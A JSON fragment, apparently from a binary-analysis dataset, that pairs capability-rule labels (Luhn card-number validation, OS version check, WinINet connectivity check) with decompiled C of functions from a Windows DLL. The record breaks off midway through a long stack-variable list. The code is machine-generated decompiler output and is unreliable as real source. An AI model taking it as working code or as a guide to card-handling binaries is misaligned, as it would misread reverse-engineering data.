        "decompiled_code": "\nvoid fcn.180030e4c(ulong arg1, uint64_t arg2, ulong arg3, uint64_t arg4)\n\n{\n    int32_t *piVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    int64_t *piVar4;\n    int64_t iVar5;\n    int64_t hModule;\n    int64_t iStack24;\n    ulong uStack16;\n    \n    uStack16 = 0xfffffffffffffffe;\n    piVar4 = fcn.180012330();\n    if (piVar4 != NULL) {\n        iVar5 = (**(*piVar4 + 0x18))(piVar4);\n        iStack24 = iVar5 + 0x18;\n        hModule = fcn.18001231c(arg2 & 0xffffffff);\n        iVar5 = iVar5 + 0x18;\n        if ((hModule == 0) ||\n           (iVar3 = fcn.180008b80(&iStack24, hModule, arg2 & 0xffffffff),  iVar5 = iStack24,  iVar3 == 0)) {\n            LOCK();\n            piVar1 = iVar5 + -8;\n            iVar3 = *piVar1;\n            *piVar1 = *piVar1 + -1;\n            if (iVar3 + -1 < 1) {\n                (**(**(iVar5 + -0x18) + 8))();\n            }\n        }\n        else {\n            fcn.180030c2c(arg1, iStack24, arg3, arg4 & 0xffffffff);\n            LOCK();\n            piVar1 = iVar5 + -8;\n            iVar3 = *piVar1;\n            *piVar1 = *piVar1 + -1;\n            if (iVar3 + -1 < 1) {\n                (**(**(iVar5 + -0x18) + 8))();\n            }\n        }\n        return;\n    }\n    fcn.180001214(0x80004005);\n    pcVar2 = swi(3);\n    (*pcVar2)();\n    return;\n}\n",
        "token_count": 451
    },
    "1800315c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4"
        ],
        "decompiled_code": "\nvoid fcn.1800315cc(int64_t arg1, int64_t arg2)\n\n{\n    uint32_t uVar1;\n    code *pcVar2;\n    ulong uVar3;\n    ulong *puVar4;\n    uint64_t *puVar5;\n    ulong uStackX8;\n    int64_t aiStackX24 [2];\n    \n    if ((~*(arg1 + 0x20) & 1) == 0) {\n        uVar3 = 0;\n        if (*(arg1 + 0x58) == 0) {\n            uStackX8 = fcn.180009660(0x28);\n            if (uStackX8 != 0) {\n                uVar3 = fcn.180032afc(uStackX8);\n            }\n            *(arg1 + 0x58) = uVar3;\n            fcn.18003279c(uVar3, 1, *(arg1 + 0x68));\n            if (*(*(arg1 + 0x58) + 0x10) < 1) {\n                fcn.180012514();\n                pcVar2 = swi(3);\n                (*pcVar2)();\n                return;\n            }\n            **(*(arg1 + 0x58) + 8) = 0;\n            *(arg1 + 0x50) = 1;\n            aiStackX24[0] = 0;\n            fcn.1800314b0(arg1, aiStackX24);\n            uStackX8 = uStackX8 & 0xffffffff00000000;\n            fcn.180031260(aiStackX24[0], 0, &uStackX8, 1);\n        }\n        if (arg2 != 0) {\n            fcn.180031010(arg1);\n            fcn.180032b1c(*(arg1 + 0x58), *(arg1 + 0x50), arg2, 1);\n            aiStackX24[0] = 0;\n            fcn.18002d158(*(arg1 + 0x60), 1, aiStackX24);\n            if (aiStackX24[0] == 0) {\n                fcn.180012514();\n                pcVar2 = swi(3);\n                (*pcVar2)();\n                return;\n            }\n            uStackX8 = CONCAT44(uStackX8._4_4_, 2);\n            fcn.180031260(aiStackX24[0], *(arg1 + 0x50), &uStackX8, 1);\n            *(arg1 + 0x50) = *(arg1 + 0x50) + 1;\n        }\n    }\n    else {\n        uVar3 = 0;\n        if (*(arg1 + 0x58) == 0) {\n            uStackX8 = fcn.180009660(0x38);\n            if (uStackX8 != 0) {\n                uVar3 = fcn.18002d2a4(uStackX8, *(arg1 + 0x68));\n            }\n            *(arg1 + 0x58) = uVar3;\n            fcn.18002d01c(uVar3, *(arg1 + 0x6c), 1);\n            puVar4 = fcn.18002d358(*(arg1 + 0x58), 0);\n            *puVar4 = 0;\n            *(arg1 + 0x50) = 1;\n        }\n        if (arg2 != 0) {\n            fcn.180031010(arg1);\n            uVar1 = *(arg1 + 0x50);\n            puVar5 = fcn.18002d358(*(arg1 + 0x58), arg2);\n            *puVar5 = uVar1;\n            *(arg1 + 0x50) = *(arg1 + 0x50) + 1;\n        }\n    }\n    return;\n}\n",
        "token_count": 860
    },
    "18003190": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint64_t fcn.180031908(int64_t arg1, int64_t arg2, uint32_t *arg3, uint32_t *arg4)\n\n{\n    uint16_t uVar1;\n    uint16_t *puVar2;\n    code *pcVar3;\n    int32_t iVar4;\n    int64_t iVar5;\n    uint64_t uVar6;\n    uint64_t *puVar7;\n    uint32_t uVar8;\n    uint32_t uVar9;\n    uint32_t auStackX8 [2];\n    ulong uStack56;\n    int64_t iStack48;\n    \n    if ((*(arg1 + 0x20) & 1) == 0) {\n        fcn.18002b424(1, *(arg1 + 0x18));\n        pcVar3 = swi(3);\n        iVar5 = (*pcVar3)();\n        return iVar5;\n    }\n    if ((arg2 != 0) && (*(arg2 + 0xc) == 0xffff)) {\n        fcn.1800124f0();\n        pcVar3 = swi(3);\n        iVar5 = (*pcVar3)();\n        return iVar5;\n    }\n    fcn.1800315cc(arg1, 0);\n    if ((*(arg1 + 0x20) & 1) == 0) {\n        fcn.18002b424(4, *(arg1 + 0x18));\n        pcVar3 = swi(3);\n        iVar5 = (*pcVar3)();\n        return iVar5;\n    }\n    uVar6 = *(arg1 + 0x38) + 2;\n    if (*(arg1 + 0x40) <= uVar6 && uVar6 != *(arg1 + 0x40)) {\n        fcn.18002b7a4(arg1, (*(arg1 + 0x38) - *(arg1 + 0x40)) + 2);\n    }\n    puVar2 = *(arg1 + 0x38);\n    uVar1 = *puVar2;\n    *(arg1 + 0x38) = puVar2 + 1;\n    if (uVar1 == 0x7fff) {\n        if ((*(arg1 + 0x20) & 1) == 0) {\n            fcn.18002b424(4, *(arg1 + 0x18));\n            pcVar3 = swi(3);\n            iVar5 = (*pcVar3)();\n            return iVar5;\n        }\n        if (*(arg1 + 0x40) <= puVar2 + 3 && puVar2 + 3 != *(arg1 + 0x40)) {\n            fcn.18002b7a4(arg1, (*(arg1 + 0x38) - *(arg1 + 0x40)) + 4);\n        }\n        uVar9 = **(arg1 + 0x38);\n        *(arg1 + 0x38) = *(arg1 + 0x38) + 1;\n    }\n    else {\n        uVar9 = (uVar1 & 0x8000) << 0x10 | uVar1 & 0xffff7fff;\n    }\n    if (uVar9 < 0) {\n        if (uVar1 == 0xffff) {\n            iVar5 = fcn.18002b96c(arg1, auStackX8);\n            if (iVar5 == 0) {\n                fcn.18002b424(6, *(arg1 + 0x18));\n                pcVar3 = swi(3);\n                iVar5 = (*pcVar3)();\n                return iVar5;\n            }\n            if ((*(iVar5 + 0xc) & 0x7fffffff) != auStackX8[0]) {\n                if (-1 < *(iVar5 + 0xc)) {\n                    fcn.18002b424(7, *(arg1 + 0x18));\n                    pcVar3 = swi(3);\n                    iVar5 = (*pcVar3)();\n                    return iVar5;\n                }\n                fcn.1800314b0(arg1, 0);\n                uVar6 = auStackX8[0];\n                puVar7 = fcn.18002d358(*(arg1 + 0x60), iVar5);\n                *puVar7 = uVar6;\n            }\n            fcn.180031010(arg1);\n            fcn.180032b1c(*(arg1 + 0x58), *(arg1 + 0x50), iVar5, 1);\n            iStack48 = 0;\n            fcn.18002d158(*(arg1 + 0x60), 1, &iStack48);\n            if (iStack48 == 0) {\n                fcn.180012514();\n                pcVar3 = swi(3);\n                iVar5 = (*pcVar3)();\n                return iVar5;\n            }\n            uStack56 = CONCAT44(uStack56._4_4_, 1);\n            fcn.180031260(iStack48, *(arg1 + 0x50), &uStack56, 1);\n            *(arg1 + 0x50) = *(arg1 + 0x50) + 1;\n        }\n        else {\n            uVar8 = uVar9 & 0x7fffffff;\n            if ((uVar8 == 0) || (*(*(arg1 + 0x58) + 0x10) - 1U < uVar8)) {\n                fcn.18002b424(5, *(arg1 + 0x18));\n                pcVar3 = swi(3);\n                iVar5 = (*pcVar3)();\n                return iVar5;\n            }\n            uStack56 = 0;\n            fcn.18002d158(*(arg1 + 0x60), 1, &uStack56);\n            if (uStack56 == 0) {\n                fcn.180012514();\n                pcVar3 = swi(3);\n                iVar5 = (*pcVar3)();\n                return iVar5;\n            }\n            if (*(uStack56 + 0x10) <= uVar8) {\n                fcn.180012514();\n                pcVar3 = swi(3);\n                iVar5 = (*pcVar3)();\n                return iVar5;\n            }\n            if (*(*(uStack56 + 8) + uVar8 * 4) == 2) {\n                fcn.18002b424(5, *(arg1 + 0x18));\n                pcVar3 = swi(3);\n                iVar5 = (*pcVar3)();\n                return iVar5;\n            }\n            if (*(*(arg1 + 0x58) + 0x10) <= uVar8) {\n                fcn.180012514();\n                pcVar3 = swi(3);\n                iVar5 = (*pcVar3)();\n                return iVar5;\n            }\n            iVar5 = *(*(*(arg1 + 0x58) + 8) + uVar8 * 8);\n            auStackX8[0] = 0;\n            if ((*(arg1 + 0x60) == 0) || (iVar4 = fcn.18002d158(*(arg1 + 0x60), iVar5, &uStack56),  iVar4 == 0)) {\n                auStackX8[0] = *(iVar5 + 0xc) & 0x7fffffff;\n            }\n            else {\n                auStackX8[0] = uStack56;\n            }\n        }\n        if ((arg2 != 0) && (iVar4 = fcn.18001c978(iVar5, arg2),  iVar4 == 0)) {\n            fcn.18002b424(6, *(arg1 + 0x18));\n            pcVar3 = swi(3);\n            iVar5 = (*pcVar3)();\n            return iVar5;\n        }\n        if (arg3 == NULL) {\n            *(arg1 + 0x14) = auStackX8[0];\n        }\n        else {\n            *arg3 = auStackX8[0];\n        }\n        if (arg4 != NULL) {\n            *arg4 = uVar9;\n        }\n    }\n    else {\n        if (arg4 == NULL) {\n            fcn.18002b424(5, *(arg1 + 0x18));\n            pcVar3 = swi(3);\n            iVar5 = (*pcVar3)();\n            return iVar5;\n        }\n        *arg4 = uVar9;\n        iVar5 = 0;\n    }\n    return iVar5;\n}\n",
        "token_count": 1883
    },
    "18004218": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4"
        ],
        "decompiled_code": "\nint32_t fcn.180042180(ulong arg1, ulong arg2)\n\n{\n    int64_t arg1_00;\n    int32_t iVar1;\n    int64_t lpCriticalSection;\n    int32_t iVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    int64_t iVar5;\n    \n    iVar4 = 0;\n    iVar2 = 0;\n    fcn.180040568(1, arg2);\n    for (uVar3 = 0; uVar3 < *0x18006f6c0; uVar3 = uVar3 + 1) {\n        iVar5 = uVar3;\n        if ((*(*0x18006e6a0 + iVar5 * 8) != 0) &&\n           (lpCriticalSection = *(*0x18006e6a0 + iVar5 * 8),  (*(lpCriticalSection + 0x18) & 0x83) != 0)) {\n            fcn.180039e60(uVar3, lpCriticalSection);\n            arg1_00 = *(*0x18006e6a0 + iVar5 * 8);\n            if ((*(arg1_00 + 0x18) & 0x83) != 0) {\n                if (arg1 == 1) {\n                    iVar1 = fcn.180042138(arg1_00, lpCriticalSection);\n                    if (iVar1 != -1) {\n                        iVar4 = iVar4 + 1;\n                    }\n                }\n                else if (((arg1 == 0) && ((*(arg1_00 + 0x18) & 2) != 0)) &&\n                        (iVar1 = fcn.180042138(arg1_00, lpCriticalSection),  iVar1 == -1)) {\n                    iVar2 = -1;\n                }\n            }\n            fcn.180039ee8(uVar3, *(*0x18006e6a0 + iVar5 * 8));\n        }\n    }\n    fcn.180040468(1);\n    if (arg1 == 1) {\n        iVar2 = iVar4;\n    }\n    return iVar2;\n}\n",
        "token_count": 461
    },
    "1800144b": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nulong fcn.1800144b0(int64_t arg1)\n\n{\n    ulong uVar1;\n    \n    if (*(arg1 + 8) == 0) {\n        uVar1 = 0;\n    }\n    else {\n        uVar1 = fcn.18001446c(arg1);\n        uVar1 = (*_sym.imp.USER32.dll_DestroyMenu)(uVar1);\n    }\n    return uVar1;\n}\n",
        "token_count": 94
    },
    "18000194": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid fcn.180001948(ulong arg1, ulong arg2)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    int64_t iVar3;\n    code *pcVar4;\n    int64_t iVar5;\n    code *pcVar6;\n    uchar auStack3048 [32];\n    uchar auStack3016 [4];\n    uchar uStack3012;\n    uchar uStack3011;\n    uchar uStack3010;\n    uchar uStack3009;\n    uchar uStack3008;\n    uchar uStack3007;\n    uchar uStack3006;\n    uchar uStack3005;\n    uchar uStack3004;\n    uchar uStack3003;\n    uchar uStack3002;\n    uchar uStack3001;\n    uchar uStack3000;\n    uchar uStack2999;\n    uchar uStack2998;\n    uchar uStack2997;\n    uchar uStack2996;\n    uchar uStack2995;\n    uchar uStack2994;\n    uchar uStack2993;\n    uchar uStack2992;\n    uchar uStack2991;\n    uchar uStack2990;\n    uchar uStack2989;\n    uchar uStack2988;\n    uchar uStack2987;\n    uchar uStack2986;\n    uchar uStack2985;\n    uchar uStack2984;\n    uchar uStack2983;\n    uchar uStack2982;\n    uchar uStack2981;\n    uchar uStack2980;\n    uchar uStack2979;\n    uchar uStack2978;\n    uchar uStack2977;\n    uchar uStack2976;\n    uchar uStack2975;\n    uchar uStack2974;\n    uchar uStack2973;\n    uchar uStack2972;\n    uchar uStack2971;\n    uchar uStack2970;\n    uchar uStack2969;\n    uchar uStack2968;\n    uchar uStack2967;\n    uchar uStack2966;\n    uchar uStack2965;\n    uchar uStack2964;\n    uchar uStack2963;\n    uchar uStack2962;\n    uchar uStack2961;\n    uchar uStack2960;\n    uchar uStack2959;\n    uchar uStack2958;\n    uchar uStack2957;\n    uchar uStack2956;\n    uchar uStack2955;\n    uchar uStack2954;\n    uchar uStack2953;\n    uchar uStack2952;\n    uchar uStack2951;\n    uchar uStack2950;\n    uchar uStack2949;\n    uchar uStack2948;\n    uchar uStack2947;\n    uchar uStack2946;\n    uchar uStack2945;\n    uchar uStack2944;\n    uchar uStack2943;\n    uchar uStack2942;\n    uchar uStack2941;\n    uchar uStack2940;\n    uchar uStack2939;\n    uchar uStack2938;\n    uchar uStack2937;\n    uchar uStack2936;\n    uchar uStack2935;\n    uchar uStack2934;\n    uchar uStack2933;\n    uchar uStack2932;\n    uchar uStack2931;\n    uchar uStack2930;\n    uchar uStack2929;\n    uchar uStack2928;\n    uchar uStack2927;\n    uchar uStack2926;\n    uchar uStack2925;\n    uchar uStack2924;\n    uchar uStack2923;\n    uchar uStack2922;\n    uchar uStack2921;\n    uchar uStack2920;\n    uchar uStack2919;\n    uchar uStack2918;\n    uchar uStack2917;\n    uchar uStack2916;\n    uchar uStack2915;\n    uchar uStack2914;\n    uchar uStack2913;\n    uchar uStack2912;\n    uchar uStack2911;\n    uchar uStack2910;\n    uchar uStack2909;\n    uchar uStack2908;\n    uchar uStack2907;\n    uchar uStack2906;\n    uchar uStack2905;\n    uchar uStack2904;\n    uchar uStack2903;\n    uchar uStack2902;\n    uchar uStack2901;\n    uchar uStack2900;\n    uchar uStack2899;\n    uchar uStack2898;\n    uchar uStack2897;\n    uchar uStack2896;\n    uchar uStack2895;\n    uchar uStack2894;\n    uchar uStack2893;\n    uchar uStack2892;\n    uchar uStack2891;\n    uchar uStack2890;\n    uchar uStack2889;\n    uchar uStack2888;\n    uchar uStack2887;\n    uchar uStack2886;\n    uchar uStack2885;\n    uchar uStack2884;\n    uchar uStack2883;\n    uchar uStack2882;\n    uchar uStack2881;\n    uchar uStack2880;\n    uchar uStack2879;\n    uchar uStack2878;\n    uchar uStack2877;\n    uchar uStack2876;\n    uchar uStack2875;\n    uchar uStack2874;\n    uchar uStack2873;\n    uchar uStack2872;\n    uchar uStack2871;\n    uchar uStack2870;\n    uchar uStack2869;\n    uchar uStack2868;\n    uchar uStack2867;\n    uchar uStack2866;\n    uchar uStack2865;\n    uchar uStack2864;\n    uchar uStack2863;\n    uchar uStack2862;\n    uchar uStack2861;\n    uchar uStack2860;\n    uchar uStack2859;\n    uchar uStack2858;\n    uchar uStack2857;\n    uchar uStack2856;\n    uchar uStack2855;\n    uchar uStack2854;\n    uchar uStack2853;\n    uchar uStack2852;\n    uchar uStack2851;\n    uchar uStack2850;\n    uchar uStack2849;\n    uchar uStack2848;\n    uchar uStack2847;\n    uchar uStack2846;\n    uchar uStack2845;\n    uchar uStack2844;\n    uchar uStack2843;\n    uchar uStack2842;\n    uchar uStack2841;\n    uchar uStack2840;\n    uchar uStack2839;\n    uchar uStack2838;\n    uchar uStack2837;\n    uchar uStack2836;\n    uchar uStack2835;\n    uchar uStack2834;\n    uchar uStack2833;\n    uchar uStack2832;\n    uchar uStack2831;\n    uchar uStack2830;\n    uchar uStack2829;\n    uchar uStack2828;\n    uchar uStack2827;\n    uchar uStack2826;\n    uchar uStack2825;\n    uchar uStack2824;\n    uchar uStack2823;\n    uchar uStack2822;\n    uchar uStack2821;\n    uchar uStack2820;\n    uchar uStack2819;\n    uchar uStack2818;\n    uchar uStack2817;\n    uchar uStack2816;\n    uchar uStack2815;\n    uchar uStack2814;\n    uchar uStack2813;\n    uchar uStack2812;\n    uchar uStack2811;\n    uchar uStack2810;\n    uchar uStack2809;\n    uchar uStack2808;\n    uchar uStack2807;\n    uchar uStack2806;\n    uchar uStack2805;\n    uchar uStack2804;\n    uchar uStack2803;\n    uchar uStack2802;\n    uchar uStack2801;\n    uchar uStack2800;\n    uchar uStack2799;\n    uchar uStack2798;\n    uchar uStack2797;\n    uchar uStack2796;\n    uchar uStack2795;\n    uchar uStack2794;\n    uchar uStack2793;\n    uchar uStack2792;\n    uchar uStack2791;\n    uchar uStack2790;\n    uchar uStack2789;\n    uchar uStack2788;\n    uchar uStack2787;\n    uchar uStack2786;\n    uchar uStack2785;\n    uchar uStack2784;\n    uchar uStack2783;\n    uchar uStack2782;\n    uchar uStack2781;\n    uchar uStack2780;\n    uchar uStack2779;\n    uchar uStack2778;\n    uchar uStack2777;\n    uchar uStack2776;\n    uchar uStack2775;\n    uchar uStack2774;\n    uchar uStack2773;\n    uchar uStack2772;\n    uchar uStack2771;\n    uchar uStack2770;\n    uchar uStack2769;\n    uchar uStack2768;\n    uchar uStack2767;\n    uchar uStack2766;\n    uchar uStack2765;\n    uchar uStack2764;\n    uchar uStack2763;\n    uchar uStack2762;\n    uchar uStack2761;\n    uchar uStack2760;\n    uchar uStack2759;\n    uchar uStack2758;\n    uchar uStack2757;\n    uchar uStack2756;\n    uchar uStack2755;\n    uchar uStack2754;\n    uchar uStack2753;\n    uchar uStack2752;\n    uchar uStack2751;\n    uchar uStack2750;\n    uchar uStack2749;\n    uchar uStack2748;\n    uchar uStack2747;\n    uchar uStack2746;\n    uchar uStack2745;\n    uchar uStack2744;\n    uchar uStack2743;\n    uchar uStack2742;\n    uchar uStack2741;\n    uchar uStack2740;\n    uchar uStack2739;\n    uchar uStack2738;\n    uchar uStack2737;\n    uchar uStack2736;\n    uchar uStack2735;\n    uchar uStack2734;\n    uchar uStack2733;\n    uchar uStack2732;\n    uchar uStack2731;\n    uchar uStack2730;\n    uchar uStack2729;\n    uchar uStack2728;\n    uchar uStack2727;\n    uchar uStack2726;\n    uchar uStack2725;\n    uchar uStack2724;\n    uchar uStack2723;\n    uchar uStack2722;\n    uchar uStack2721;\n    uchar uStack2720;\n    uchar uStack2719;\n    uchar uStack2718;\n    uchar uStack2717;\n    uchar uStack2716;\n    uchar uStack2715;\n    uchar uStack2714;\n    uchar uStack2713;\n    uchar uStack2712;\n    uchar uStack2711;\n    uchar uStack2710;\n    uchar uStack2709;\n    uchar uStack2708;\n    uchar uStack2707;\n    uchar uStack2706;\n    uchar uStack2705;\n    uchar uStack2704;\n    uchar uStack2703;\n    uchar uStack2702;\n    uchar uStack2701;\n    uchar uStack2700;\n    uchar uStack2699;\n    uchar uStack2698;\n    uchar uStack2697;\n    uchar uStack2696;\n    uchar uStack2695;\n    uchar uStack2694;\n    uchar uStack2693;\n    uchar uStack2692;\n    uchar uStack2691;\n    uchar uStack2690;\n    uchar uStack2689;\n    uchar uStack2688;\n    uchar uStack2687;\n    uchar uStack2686;\n    uchar uStack2685;\n    uchar uStack2684;\n    uchar uStack2683;\n    uchar uStack2682;\n    uchar uStack2681;\n    uchar uStack2680;\n    uchar uStack2679;\n    uchar uStack2678;\n    uchar uStack2677;\n    uchar uStack2676;\n    uchar uStack2675;\n    uchar uStack2674;\n    uchar uStack2673;\n    uchar uStack2672;\n    uchar uStack2671;\n    uchar uStack2670;\n    uchar uStack2669;\n    uchar uStack2668;\n    uchar uStack2667;\n    uchar uStack2666;\n    uchar uStack2665;\n    uchar uStack2664;\n    uchar uStack2663;\n    uchar uStack2662;\n    uchar uStack2661;\n    uchar uStack2660;\n    uchar uStack2659;\n    uchar uStack2658;\n    uchar uStack2657;\n    uchar uStack2656;\n    uchar uStack2655;\n    uchar uStack2654;\n    uchar uStack2653;\n    uchar uStack2652;\n    uchar uStack2651;\n    uchar uStack2650;\n    uchar uStack2649;\n    uchar uStack2648;\n    uchar uStack2647;\n    uchar uStack2646;\n    uchar uStack2645;\n    uchar uStack2644;\n    uchar uStack2643;\n    uchar uStack2642;\n    uchar uStack2641;\n    uchar uStack2640;\n    uchar uStack2639;\n    uchar uStack2638;\n    uchar uStack2637;\n    uchar uStack2636;\n    uchar uStack2635;\n    uchar uStack2634;\n    uchar uStack2633;\n    uchar uStack2632;\n    uchar uStack2631;\n    uchar uStack2630;\n    uchar uStack2629;\n    uchar uStack2628;\n    uchar uStack2627;\n    uchar uStack2626;\n    uchar uStack2625;\n    uchar uStack2624;\n    uchar uStack2623;\n    uchar uStack2622;\n    uchar uStack2621;\n    uchar uStack2620;\n    uchar uStack2619;\n    uchar uStack2618;\n    uchar uStack2617;\n    uchar uStack2616;\n    uchar uStack2615;\n    uchar uStack2614;\n    uchar uStack2613;\n    uchar uStack2612;\n    uchar uStack2611;\n    uchar uStack2610;\n    uchar uStack2609;\n    uchar uStack2608;\n    uchar uStack2607;\n    uchar uStack2606;\n    uchar uStack2605;\n    uchar uStack2604;\n    uchar uStack2603;\n    uchar uStack2602;\n    uchar uStack2601;\n    uchar uStack2600;\n    uchar uStack2599;\n    uchar uStack2598;\n    uchar uStack2597;\n    uchar uStack2596;\n    uchar uStack2595;\n    uchar uStack2594;\n    uchar uStack2593;\n    uchar uStack2592;\n    uchar uStack2591;\n    uchar uStack2590;\n    uchar uStack2589;\n    uchar uStack2588;\n    uchar uStack2587;\n    uchar uStack2586;\n    uchar uStack2585;\n    uchar uStack2584;\n    uchar uStack2583;\n    uchar uStack2582;\n    uchar uStack2581;\n    uchar uStack2580;\n    uchar uStack2579;\n    uchar uStack2578;\n    uchar uStack2577;\n    uchar uStack2576;\n    uchar uStack2575;\n    uchar uStack2574;\n    uchar uStack2573;\n    uchar uStack2572;\n    uchar uStack2571;\n    uchar uStack2570;\n    uchar uStack2569;\n    uchar uStack2568;\n    uchar uStack2567;\n    uchar uStack2566;\n    uchar uStack2565;\n    uchar uStack2564;\n    uchar uStack2563;\n    uchar uStack2562;\n    uchar uStack2561;\n    uchar uStack2560;\n    uchar uStack2559;\n    uchar uStack2558;\n    uchar uStack2557;\n    uchar uStack2556;\n    uchar uStack2555;\n    uchar uStack2554;\n    uchar uStack2553;\n    uchar uStack2552;\n    uchar uStack2551;\n    uchar uStack2550;\n    uchar uStack2549;\n    uchar uStack2548;\n    uchar uStack2547;\n    uchar uStack2546;\n    uchar uStack2545;\n    uchar uStack2544;\n    uchar uStack2543;\n    uchar uStack2542;\n    uchar uStack2541;\n    uchar uStack2540;\n    uchar uStack2539;\n    uchar uStack2538;\n    uchar uStack2537;\n    uchar uStack2536;\n    uchar uStack2535;\n    uchar uStack2534;\n    uchar uStack2533;\n    uchar uStack2532;\n    uchar uStack2531;\n    uchar uStack2530;\n    uchar uStack2529;\n    uchar uStack2528;\n    uchar uStack2527;\n    uchar uStack2526;\n    uchar uStack2525;\n    uchar uStack2524;\n    uchar uStack2523;\n    uchar uStack2522;\n    uchar uStack2521;\n    uchar uStack2520;\n    uchar uStack2519;\n    uchar uStack2518;\n    uchar uStack2517;\n    uchar uStack2516;\n    uchar uStack2515;\n    uchar uStack2514;\n    uchar uStack2513;\n    uchar uStack2512;\n    uchar uStack2511;\n    uchar uStack2510;\n    uchar uStack2509;\n    uchar uStack2508;\n    uchar uStack2507;\n    uchar uStack2506;\n    uchar uStack2505;\n    uchar uStack2504;\n    uchar uStack2503;\n    uchar uStack2502;\n    uchar uStack2501;\n    uchar uStack2500;\n    uchar uStack2499;\n    uchar uStack2498;\n    uchar uStack2497;\n    uchar uStack2496;\n    uchar uStack2495;\n    uchar uStack2494;\n    uchar uStack2493;\n    uchar uStack2492;\n    uchar uStack2491;\n    uchar uStack2490;\n    uchar uStack2489;\n    uchar uStack2488;\n    uchar uStack2487;\n    uchar uStack2486;\n    uchar uStack2485;\n    uchar uStack2484;\n    uchar uStack2483;\n    uchar uStack2482;\n    uchar uStack2481;\n    uchar uStack2480;\n    uchar uStack2479;\n    uchar uStack2478;\n    uchar uStack2477;\n    uchar uStack2476;\n    uchar uStack2475;\n    uchar uStack2474;\n    uchar uStack2473;\n    uchar uStack2472;\n    uchar uStack2471;\n    uchar uStack2470;\n    uchar uStack2469;\n    uchar uStack2468;\n    uchar uStack2467;\n    uchar uStack2466;\n    uchar uStack2465;\n    uchar uStack2464;\n    uchar uStack2463;\n    uchar uStack2462;\n    uchar uStack2461;\n    uchar uStack2460;\n    uchar uStack2459;\n    uchar uStack2458;\n    uchar uStack2457;\n    uchar uStack2456;\n    uchar uStack2455;\n    uchar uStack2454;\n    uchar uStack2453;\n    uchar uStack2452;\n    uchar uStack2451;\n    uchar uStack2450;\n    uchar uStack2449;\n    uchar uStack2448;\n    uchar uStack2447;\n    uchar uStack2446;\n    uchar uStack2445;\n    uchar uStack2444;\n    uchar uStack2443;\n    uchar uStack2442;\n    uchar uStack2441;\n    uchar uStack2440;\n    uchar uStack2439;\n    uchar uStack2438;\n    uchar uStack2437;\n    uchar uStack2436;\n    uchar uStack2435;\n    uchar uStack2434;\n    uchar uStack2433;\n    uchar uStack2432;\n    uchar uStack2431;\n    uchar uStack2430;\n    uchar uStack2429;\n    uchar uStack2428;\n    uchar uStack2427;\n    uchar uStack2426;\n    uchar uStack2425;\n    uchar uStack2424;\n    uchar uStack2423;\n    uchar uStack2422;\n    uchar uStack2421;\n    uchar uStack2420;\n    uchar uStack2419;\n    uchar uStack2418;\n    uchar uStack2417;\n    uchar uStack2416;\n    uchar uStack2415;\n    uchar uStack2414;\n    uchar uStack2413;\n    uchar uStack2412;\n    uchar uStack2411;\n    uchar uStack2410;\n    uchar uStack2409;\n    uchar uStack2408;\n    uchar uStack2407;\n    uchar uStack2406;\n    uchar uStack2405;\n    uchar uStack2404;\n    uchar uStack2403;\n    uchar uStack2402;\n    uchar uStack2401;\n    uchar uStack2400;\n    uchar uStack2399;\n    uchar uStack2398;\n    uchar uStack2397;\n    uchar uStack2396;\n    uchar uStack2395;\n    uchar uStack2394;\n    uchar uStack2393;\n    uchar uStack2392;\n    uchar uStack2391;\n    uchar uStack2390;\n    uchar uStack2389;\n    uchar uStack2388;\n    uchar uStack2387;\n    uchar uStack2386;\n    uchar uStack2385;\n    uchar uStack2384;\n    uchar uStack2383;\n    uchar uStack2382;\n    uchar uStack2381;\n    uchar uStack2380;\n    uchar uStack2379;\n    uchar uStack2378;\n    uchar uStack2377;\n    uchar uStack2376;\n    uchar uStack2375;\n    uchar uStack2374;\n    uchar uStack2373;\n    uchar uStack2372;\n    uchar uStack2371;\n    uchar uStack2370;\n    uchar uStack2369;\n    uchar uStack2368;\n    uchar uStack2367;\n    uchar uStack2366;\n    uchar uStack2365;\n    uchar uStack2364;\n    uchar uStack2363;\n    uchar uStack2362;\n    uchar uStack2361;\n    uchar uStack2360;\n    uchar uStack2359;\n    uchar uStack2358;\n    uchar uStack2357;\n    uchar uStack2356;\n    uchar uStack2355;\n    uchar uStack2354;\n    uchar uStack2353;\n    uchar uStack2352;\n    uchar uStack2351;\n    uchar uStack2350;\n    uchar uStack2349;\n    uchar uStack2348;\n    uchar uStack2347;\n    uchar uStack2346;\n    uchar uStack2345;\n    uchar uStack2344;\n    uchar uStack2343;\n    uchar uStack2342;\n    uchar uStack2341;\n    uchar uStack2340;\n    uchar uStack2339;\n    uchar uStack2338;\n    uchar uStack2337;\n    uchar uStack2336;\n    uchar uStack2335;\n    uchar uStack2334;\n    uchar uStack2333;\n    uchar uStack2332;\n    uchar uStack2331;\n    uchar uStack2330;\n    uchar uStack2329;\n    uchar uStack2328;\n    uchar uStack2327;\n    uchar uStack2326;\n    uchar uStack2325;\n    uchar uStack2324;\n    uchar uStack2323;\n    uchar uStack2322;\n    uchar uStack2321;\n    uchar uStack2320;\n    uchar uStack2319;\n    uchar 